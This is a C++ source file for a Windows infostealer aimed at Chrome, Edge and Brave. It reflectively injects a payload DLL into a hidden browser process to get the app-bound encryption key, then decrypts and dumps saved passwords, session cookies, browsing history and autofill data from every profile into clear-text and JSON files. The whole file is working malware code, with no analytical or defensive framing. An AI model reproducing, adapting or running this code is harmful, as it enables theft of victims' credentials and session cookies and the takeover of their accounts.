#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <algorithm>
#include <fstream>
#include <filesystem>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <cctype>
#include <cwctype>
#include <shlobj.h>
#include <objbase.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include "bootstrapper.h"
#include "json.hpp"
#include "sqlite3.h"

using json = nlohmann::json;
namespace fs = std::filesystem;

enum class Browser { Chrome, Edge, Brave };

struct PasswordData { std::string url, username, password; };
struct CookieData {
    std::string host, name, value, path;
    long long expires_utc;
    int is_secure, is_httponly, samesite;
};
struct HistoryData { std::string url, title; int visit_count; };
struct AutofillData { std::string name, value; };
struct ProfileData {
    std::string name;
    std::vector<PasswordData> passwords;
    std::vector<CookieData> cookies;
    std::vector<HistoryData> history;
    std::vector<AutofillData> autofill;
};

// --- BURAYA BASE64 ENCODED DLL VERİSİNİ YAPIŞTIRIN ---
const std::string EMBEDDED_DLL_BASE64 = "";

static const std::string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::vector<unsigned char> ret;

    while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }

    return ret;
}

std::string to_utf8_lossy(const std::vector<unsigned char>& input) {
    std::string output;
    output.reserve(input.size());
    for (unsigned char c : input) {
        if (c < 32 && c != '\r' && c != '\n' && c != '\t') output += ' ';
        else output += (char)c;
    }
    return output;
}

std::string ensure_utf8(const std::string& input) {
    std::string output;
    output.reserve(input.size());
    for (unsigned char c : input) {
        if (c < 32 && c != '\r' && c != '\n' && c != '\t') output += ' ';
        else output += (char)c;
    }
    return output;
}

std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
    DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB output = { 0, nullptr };
    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
        std::vector<unsigned char> res(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return res;
    }
    return {};
}

std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
    if (data.size() < 15) return {};
    BCRYPT_ALG_HANDLE h_alg = nullptr;
    BCRYPT_KEY_HANDLE h_key = nullptr;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    memset(&info, 0, sizeof(info));
    info.cbSize = sizeof(info);
    info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;
    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0) return {};
    if (BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }
    if (BCryptGenerateSymmetricKey(h_alg, &h_key, nullptr, 0, (BYTE*)key.data(), (DWORD)key.size(), 0) != 0) { BCryptCloseAlgorithmProvider(h_alg, 0); return {}; }
    std::vector<unsigned char> nonce(data.begin() + 3, data.begin() + 15);
    std::vector<unsigned char> ciphertext(data.begin() + 15, data.end() - 16);
    std::vector<unsigned char> tag(data.end() - 16, data.end());
    info.pbNonce = nonce.data();
    info.cbNonce = (DWORD)nonce.size();
    info.pbTag = tag.data();
    info.cbTag = (DWORD)tag.size();
    std::vector<unsigned char> plaintext(ciphertext.size());
    DWORD cb_plain = 0;
    if (BCryptDecrypt(h_key, ciphertext.data(), (DWORD)ciphertext.size(), &info, nullptr, 0, plaintext.data(), (DWORD)plaintext.size(), &cb_plain, 0) != 0) {
        BCryptDestroyKey(h_key);
        BCryptCloseAlgorithmProvider(h_alg, 0);
        return {};
    }
    BCryptDestroyKey(h_key);
    BCryptCloseAlgorithmProvider(h_alg, 0);
    plaintext.resize(cb_plain);
    return plaintext;
}

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return std::string();
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string strTo(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
    return strTo;
}

bool copy_file_locked(const fs::path& source, const fs::path& dest) {
    for (int i = 0; i < 3; i++) {
        HANDLE h_src = CreateFileW(source.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, 0, nullptr);
        if (h_src != INVALID_HANDLE_VALUE) {
            HANDLE h_dest = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
            if (h_dest != INVALID_HANDLE_VALUE) {
                char buffer[65536];
                DWORD bytes_read, bytes_written;
                bool has_data = false;
                while (ReadFile(h_src, buffer, sizeof(buffer), &bytes_read, nullptr) && bytes_read > 0) {
                    WriteFile(h_dest, buffer, bytes_read, &bytes_written, nullptr);
                    has_data = true;
                }
                CloseHandle(h_src);
                CloseHandle(h_dest);
                if (has_data) return true;
            } else {
                CloseHandle(h_src);
            }
        }
        Sleep(200);
    }
    return false;
}

int open_db_readonly(const std::string& path, sqlite3** db) {
    std::string uri = "file:" + path + "?mode=ro&nolock=1";
    return sqlite3_open_v2(uri.c_str(), db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI | SQLITE_OPEN_NOMUTEX, nullptr);
}

struct BrowserConfig {
    std::wstring name;
    std::wstring exe_name;
    std::vector<std::wstring> common_paths;
};

const std::vector<BrowserConfig> BROWSERS = {
    {L"Chrome", L"chrome.exe", {L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"}},
    {L"Edge", L"msedge.exe", {L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"}},
    {L"Brave", L"brave.exe", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}}
};

std::wstring find_browser_exe(const std::wstring& name) {
    for (const auto& b : BROWSERS) {
        std::wstring b_name_lower = b.name;
        std::wstring target_name_lower = name;
        std::transform(b_name_lower.begin(), b_name_lower.end(), b_name_lower.begin(), ::towlower);
        std::transform(target_name_lower.begin(), target_name_lower.end(), target_name_lower.begin(), ::towlower);
        if (b_name_lower == target_name_lower) {
            for (const auto& path : b.common_paths) {
                if (fs::exists(path)) return path;
            }
        }
    }
    return L"";
}

DWORD find_main_process(const std::wstring& exe_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    std::vector<DWORD> pids;
    if (Process32FirstW(snapshot, &entry)) {
        do {
            std::wstring current_exe = entry.szExeFile;
            std::wstring exe_name_lower = exe_name;
            std::wstring current_exe_lower = current_exe;
            std::transform(exe_name_lower.begin(), exe_name_lower.end(), exe_name_lower.begin(), ::towlower);
            std::transform(current_exe_lower.begin(), current_exe_lower.end(), current_exe_lower.begin(), ::towlower);

            if (current_exe_lower == exe_name_lower) {
                pids.push_back(entry.th32ProcessID);
            }
        } while (Process32NextW(snapshot, &entry));
    }

    DWORD main_pid = 0;
    for (DWORD pid : pids) {
        HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (h) {
            main_pid = pid;
            CloseHandle(h);
            break;
        }
    }

    CloseHandle(snapshot);
    return main_pid;
}

void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& dll_bytes) {
    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)dll_bytes.data();
    IMAGE_NT_HEADERS64* nt_headers = (IMAGE_NT_HEADERS64*)(dll_bytes.data() + dos_header->e_lfanew);

    size_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    void* preferred_base = (void*)nt_headers->OptionalHeader.ImageBase;

    void* remote_base = VirtualAllocEx(h_process, preferred_base, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    bool relocation_required = false;

    if (!remote_base) {
        relocation_required = true;
        remote_base = VirtualAllocEx(h_process, NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_base) return;

    WriteProcessMemory(h_process, remote_base, dll_bytes.data(), nt_headers->OptionalHeader.SizeOfHeaders, NULL);

    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)((size_t)nt_headers + sizeof(IMAGE_NT_HEADERS64));
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (sections[i].PointerToRawData == 0 || sections[i].SizeOfRawData == 0) continue;
        void* remote_section = (void*)((size_t)remote_base + sections[i].VirtualAddress);
        void* local_section = (void*)(dll_bytes.data() + sections[i].PointerToRawData);
        WriteProcessMemory(h_process, remote_section, local_section, sections[i].SizeOfRawData, NULL);
    }

    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");
    DllInfo dll_info = {
        remote_base,
        (LoadLibraryA_t)GetProcAddress(h_kernel32, "LoadLibraryA"),
        (GetProcAddress_t)GetProcAddress(h_kernel32, "GetProcAddress"),
        relocation_required
    };

    size_t bootstrapper_size = (size_t)realign_pe_end - (size_t)realign_pe;
    if (bootstrapper_size == 0) bootstrapper_size = 4096;

    size_t total_size = sizeof(DllInfo) + bootstrapper_size;
    void* remote_bootstrap = VirtualAllocEx(h_process, NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(h_process, remote_bootstrap, &dll_info, sizeof(DllInfo), NULL);
    void* remote_code = (void*)((size_t)remote_bootstrap + sizeof(DllInfo));
    WriteProcessMemory(h_process, remote_code, (void*)realign_pe, bootstrapper_size, NULL);

    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)remote_code, remote_bootstrap, 0, NULL);
    if (h_thread) {
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread);
    }
}

void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& browser) {
    std::wcout << L"\n--- Processing Browser: " << browser.name << L" ---" << std::endl;

    DWORD existing_pid = find_main_process(browser.exe_name);
    HANDLE h_process = NULL;
    bool process_started_by_us = false;
    PROCESS_INFORMATION pi = { 0 };

    if (existing_pid != 0) {
        std::wcout << L"Found existing " << browser.name << L" process (PID: " << existing_pid << L"). Injecting..." << std::endl;
        h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, existing_pid);
    }

    if (!h_process) {
        std::wcout << L"Starting new " << browser.name << L" process..." << std::endl;
        std::wstring cmd = browser.exe_name + L" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
        std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
        cmd_buf.push_back(0);

        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        BOOL success = CreateProcessW(NULL, cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
        if (!success) {
            std::wstring path = find_browser_exe(browser.name);
            if (!path.empty()) {
                std::wstring full_cmd = L"\"" + path + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
                std::vector<wchar_t> full_cmd_buf(full_cmd.begin(), full_cmd.end());
                full_cmd_buf.push_back(0);
                success = CreateProcessW(NULL, full_cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
            }
        }

        if (success) {
            h_process = pi.hProcess;
            process_started_by_us = true;
        } else {
            std::wcerr << L"Failed to create or open " << browser.exe_name << L" process" << std::endl;
            return;
        }
    }

    HANDLE h_pipe = CreateNamedPipeW(L"\\\\.\\pipe\\chrome_extractor", PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 50 * 1024 * 1024, 50 * 1024 * 1024, 0, NULL);
    if (h_pipe == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create named pipe. Error: " << GetLastError() << std::endl;
    }

    inject_dll_reflective(h_process, dll_bytes);
    if (process_started_by_us) ResumeThread(pi.hThread);

    std::vector<unsigned char> v10_key, v20_key;

    // --- Extraction Logic Start ---
    char* user_profile_env = getenv("USERPROFILE");
    if (user_profile_env) {
        fs::path user_profile(user_profile_env);
        fs::path data_path;
        if (browser.name == L"Chrome") data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
        else if (browser.name == L"Edge") data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
        else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";

        std::string ls_str;
        std::ifstream ls_file(data_path / "Local State");
        if (ls_file) ls_str.assign((std::istreambuf_iterator<char>(ls_file)), std::istreambuf_iterator<char>());

        json ls_json = json::parse(ls_str, nullptr, false);
        if (!ls_json.is_discarded() && ls_json.contains("os_crypt") && ls_json["os_crypt"].contains("encrypted_key")) {
            std::string key_b64 = ls_json["os_crypt"]["encrypted_key"];
            auto decoded = base64_decode(key_b64);
            if (decoded.size() > 5 && std::string((char*)decoded.data(), 5) == "DPAPI") {
                v10_key = decrypt_dpapi(std::vector<unsigned char>(decoded.begin() + 5, decoded.end()));
            }
        }

        if (h_pipe != INVALID_HANDLE_VALUE) {
            std::cout << "Waiting for DLL to send v20 master key..." << std::endl;
            if (ConnectNamedPipe(h_pipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
                unsigned char key_buf[1024];
                DWORD bytes_read;
                if (ReadFile(h_pipe, key_buf, sizeof(key_buf), &bytes_read, NULL) && bytes_read > 0) {
                    v20_key.assign(key_buf, key_buf + bytes_read);
                    std::cout << "Received v20 master key (" << v20_key.size() << " bytes) from DLL." << std::endl;
                }
            }
            CloseHandle(h_pipe);
            h_pipe = INVALID_HANDLE_VALUE;
        }

        std::vector<std::string> profiles = { "Default" };
        for (const auto& entry : fs::directory_iterator(data_path)) {
            if (entry.is_directory() && entry.path().filename().string().find("Profile ") == 0) profiles.push_back(entry.path().filename().string());
        }

        fs::path temp_dir = user_profile / "AppData/Local/Temp/chrome_db";
        fs::create_directories(temp_dir);

        json collected = json::array();

        for (auto& profile : profiles) {
            fs::path p_path = data_path / profile;
            ProfileData p_data;
            p_data.name = profile;

            // Passwords
            fs::path db_path = p_path / "Login Data";
            fs::path tmp_db = temp_dir / (profile + "_pass.tmp");
            if (fs::exists(db_path) && copy_file_locked(db_path, tmp_db)) {
                sqlite3* db;
                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                    sqlite3_stmt* stmt;
                    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                        while (sqlite3_step(stmt) == SQLITE_ROW) {
                            const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
                            const char* t_user = (const char*)sqlite3_column_text(stmt, 1);
                            const unsigned char* pass_blob = (const unsigned char*)sqlite3_column_blob(stmt, 2);
                            int pass_len = sqlite3_column_bytes(stmt, 2);
                            if (pass_blob && pass_len > 0) {
                                std::vector<unsigned char> enc_pass(pass_blob, pass_blob + pass_len);
                                bool is_v20 = (enc_pass.size() > 3 && std::string((char*)enc_pass.data(), 3) == "v20");
                                auto& key = is_v20 ? v20_key : v10_key;
                                if (!key.empty()) {
                                    auto dec = aes_gcm_decrypt(key, enc_pass);
                                    if (!dec.empty()) {
                                        if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
                                        p_data.passwords.push_back({ t_url ? t_url : "", t_user ? t_user : "", to_utf8_lossy(dec) });
                                    }
                                }
                            }
                        }
                        sqlite3_finalize(stmt);
                    }
                    sqlite3_close(db);
                }
                fs::remove(tmp_db);
            }

            // Cookies
            db_path = p_path / "Network/Cookies";
            if (!fs::exists(db_path)) db_path = p_path / "Cookies";
            tmp_db = temp_dir / (profile + "_cook.tmp");
            if (fs::exists(db_path) && copy_file_locked(db_path, tmp_db)) {
                sqlite3* db;
                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                    sqlite3_stmt* stmt;
                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                        while (sqlite3_step(stmt) == SQLITE_ROW) {
                            const char* t_host = (const char*)sqlite3_column_text(stmt, 0);
                            const char* t_name = (const char*)sqlite3_column_text(stmt, 1);
                            const char* t_path = (const char*)sqlite3_column_text(stmt, 2);
                            long long expires = sqlite3_column_int64(stmt, 3);
                            int secure = sqlite3_column_int(stmt, 4);
                            int httponly = sqlite3_column_int(stmt, 5);
                            int samesite = sqlite3_column_int(stmt, 6);
                            const unsigned char* enc_blob = (const unsigned char*)sqlite3_column_blob(stmt, 7);
                            int enc_len = sqlite3_column_bytes(stmt, 7);
                            if (enc_blob && enc_len > 0) {
                                std::vector<unsigned char> enc_val(enc_blob, enc_blob + enc_len);
                                bool is_v20 = (enc_val.size() > 3 && std::string((char*)enc_val.data(), 3) == "v20");
                                auto& key = is_v20 ? v20_key : v10_key;
                                if (!key.empty()) {
                                    auto dec = aes_gcm_decrypt(key, enc_val);
                                    if (!dec.empty()) {
                                        if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
                                        p_data.cookies.push_back({ t_host ? t_host : "", t_name ? t_name : "", to_utf8_lossy(dec), t_path ? t_path : "", expires, secure, httponly, samesite });
                                    }
                                }
                            }
                        }
                        sqlite3_finalize(stmt);
                    }
                    sqlite3_close(db);
                }
                fs::remove(tmp_db);
            }

            // History
            db_path = p_path / "History";
            tmp_db = temp_dir / (profile + "_hist.tmp");
            if (fs::exists(db_path) && copy_file_locked(db_path, tmp_db)) {
                sqlite3* db;
                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                    sqlite3_stmt* stmt;
                    if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
                        while (sqlite3_step(stmt) == SQLITE_ROW) {
                            const char* t_url = (const char*)sqlite3_column_text(stmt, 0);
                            const char* t_title = (const char*)sqlite3_column_text(stmt, 1);
                            p_data.history.push_back({ t_url ? t_url : "", t_title ? t_title : "", sqlite3_column_int(stmt, 2) });
                        }
                        sqlite3_finalize(stmt);
                    }
                    sqlite3_close(db);
                }
                fs::remove(tmp_db);
            }

            // Autofill
            db_path = p_path / "Web Data";
            tmp_db = temp_dir / (profile + "_web.tmp");
            if (fs::exists(db_path) && copy_file_locked(db_path, tmp_db)) {
                sqlite3* db;
                if (open_db_readonly(wstring_to_utf8(tmp_db.wstring()), &db) == SQLITE_OK) {
                    sqlite3_stmt* stmt;
                    if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, nullptr) == SQLITE_OK) {
                        while (sqlite3_step(stmt) == SQLITE_ROW) {
                            const char* t_name = (const char*)sqlite3_column_text(stmt, 0);
                            const char* t_val = (const char*)sqlite3_column_text(stmt, 1);
                            p_data.autofill.push_back({ t_name ? t_name : "", t_val ? t_val : "" });
                        }
                        sqlite3_finalize(stmt);
                    }
                    sqlite3_close(db);
                }
                fs::remove(tmp_db);
            }

            // Save reports
            fs::path browser_dir(browser.name);
            fs::create_directories(browser_dir);
            std::string p_name_sanitized = profile;
            std::replace(p_name_sanitized.begin(), p_name_sanitized.end(), '/', '_');
            std::replace(p_name_sanitized.begin(), p_name_sanitized.end(), '\\', '_');
            std::replace(p_name_sanitized.begin(), p_name_sanitized.end(), ':', '_');
            fs::path profile_dir = browser_dir / p_name_sanitized;
            fs::create_directories(profile_dir);

            std::ofstream pass_file(profile_dir / "passwords.txt");
            for (auto& p : p_data.passwords) pass_file << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n";
            pass_file.close();

            std::ofstream cookie_file(profile_dir / "cookies.txt");
            json cookie_json_list = json::array();
            for (auto& c : p_data.cookies) {
                cookie_file << "Host: " << c.host << " | Name: " << c.name << " | Value: " << c.value << "\n";
                json cj;
                std::string host_raw = c.host;
                if (host_raw.find("http") != 0) host_raw = "https://" + (host_raw[0] == '.' ? host_raw.substr(1) : host_raw);
                if (host_raw.back() != '/') host_raw += "/";
                cj["Host raw"] = host_raw;
                cj["Name raw"] = c.name;
                cj["Path raw"] = c.path;
                cj["Content raw"] = c.value;
                long long unix_ts = (c.expires_utc / 1000000) - 11644473600LL;
                std::time_t t = (std::time_t)unix_ts;
                struct tm *tm_ptr = std::gmtime(&t);
                char date_buf[64];
                if (tm_ptr && std::strftime(date_buf, sizeof(date_buf), "%d-%m-%Y %H:%M:%S", tm_ptr)) cj["Expires"] = std::string(date_buf);
                cj["Expires raw"] = std::to_string(unix_ts);
                cj["Send for"] = c.is_secure ? "Encrypted connections only" : "Any type of connection";
                cj["Send for raw"] = c.is_secure ? "true" : "false";
                cj["HTTP only raw"] = c.is_httponly ? "true" : "false";
                std::string ss_str = "no_restriction";
                if (c.samesite == 1) ss_str = "lax";
                else if (c.samesite == 2) ss_str = "strict";
                cj["SameSite raw"] = ss_str;
                cj["This domain only"] = (c.host[0] == '.') ? "Valid for subdomains" : "Valid for host only";
                cj["This domain only raw"] = (c.host[0] == '.') ? "false" : "true";
                cj["First Party Domain"] = "";
                cookie_json_list.push_back(cj);
            }
            cookie_file.close();

            std::ofstream(profile_dir / "cookies.json") << cookie_json_list.dump(4);
            json pj_pass = json::array();
            for (auto& p : p_data.passwords) pj_pass.push_back({{"url", p.url}, {"username", p.username}, {"password", p.password}});
            std::ofstream(profile_dir / "passwords.json") << pj_pass.dump(4);
            json pj_hist = json::array();
            for (auto& h : p_data.history) pj_hist.push_back({{"url", h.url}, {"title", h.title}, {"visit_count", h.visit_count}});
            std::ofstream(profile_dir / "history.json") << pj_hist.dump(4);
            json pj_auto = json::array();
            for (auto& a : p_data.autofill) pj_auto.push_back({{"name", a.name}, {"value", a.value}});
            std::ofstream(profile_dir / "autofill.json") << pj_auto.dump(4);

            std::cout << "[+] Saved data for profile: " << profile << std::endl;
        }
    }

    if (h_pipe != INVALID_HANDLE_VALUE) CloseHandle(h_pipe);

    if (process_started_by_us) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        CloseHandle(h_process);
    }
}

int main(int argc, char* argv[]) {
    std::string browser_choice = "all";
    if (argc > 1) {
        std::string arg1 = argv[1];
        if (arg1 == "-b" || arg1 == "--browser") {
            if (argc > 2) browser_choice = argv[2];
        }
    }

    std::vector<unsigned char> dll_bytes;
    if (!EMBEDDED_DLL_BASE64.empty()) {
        dll_bytes = base64_decode(EMBEDDED_DLL_BASE64);
    } else {
        std::ifstream file("payload.dll", std::ios::binary);
        if (file) {
            dll_bytes = std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        }
    }

    if (dll_bytes.empty()) {
        std::cerr << "DLL not found (embedded or payload.dll)" << std::endl;
        return 1;
    }

    for (const auto& config : BROWSERS) {
        std::string name_lower(config.name.begin(), config.name.end());
        std::transform(name_lower.begin(), name_lower.end(), name_lower.begin(), ::tolower);
        if (browser_choice == "all" || browser_choice == name_lower) {
            inject_and_collect(dll_bytes, config);
        }
    }

    return 0;
}
